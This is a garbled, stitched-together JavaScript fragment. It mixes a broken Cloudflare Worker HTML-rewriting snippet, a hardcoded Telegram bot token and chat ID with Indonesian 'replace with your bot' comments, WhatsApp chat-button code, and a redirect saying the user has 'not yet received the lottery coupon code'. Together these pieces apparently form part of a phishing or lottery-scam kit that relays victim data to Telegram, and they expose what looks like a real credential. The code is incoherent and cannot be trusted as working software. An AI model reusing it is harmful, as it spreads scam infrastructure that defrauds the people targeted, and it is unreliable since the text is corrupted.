...
export default {
  async fetch(request, env, ctx) {
    ...
    const rewriter = new HTMLRewriter().on('body', {
      element(element) {
        element.setAttribute('data-experiments', activeExperiments.join(<script type='module' src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
...
var token = '7701865508:AAFkHJ59PxwgxdC26KWML9IGWvvwCF7-0fs'; // Ganti dengan token bot yang kamu buat
    var grup = '8063405455'; // Ganti dengan chat id dari bot yang kamu buat
...
function newFunction() {
  return 'function whatsappButton({brandName:t="",buttonName:e="",brandSubtitleText:a="",welcomeMessage:o="",phoneNumber:i="",brandImageUrl:r="",callToAction:n="",buttonSize:l="large",buttonMargin:p="false",buttonIconSize:s=22,prefillMessage:d="",buttonPosition:w="right"}){var c=""===d?o:d;let b=`
      <div>
...
function getcs(){
  ...
  audio = document.getElementById("bsi");
    ...
    audio4.loop = false
setTimeout(function(){  
location.href="https://api.whatsapp.com/send?phone=62811251289&text=Saya Belum Mendapatkan Kode Kupon Undian"
    }, 4000);    
